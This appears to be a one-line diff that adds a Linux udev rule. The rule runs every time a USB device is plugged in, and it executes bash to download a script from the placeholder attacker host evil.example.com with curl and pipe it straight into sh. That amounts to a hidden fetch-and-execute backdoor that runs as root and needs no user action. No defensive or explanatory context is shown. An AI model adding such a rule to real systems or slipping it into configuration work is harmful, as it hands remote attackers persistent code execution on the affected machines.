@@ -1,0 +1,1 @@
+ACTION=="add", SUBSYSTEM=="usb", RUN+="/bin/bash -c 'curl http://evil.example.com/usb | sh'"
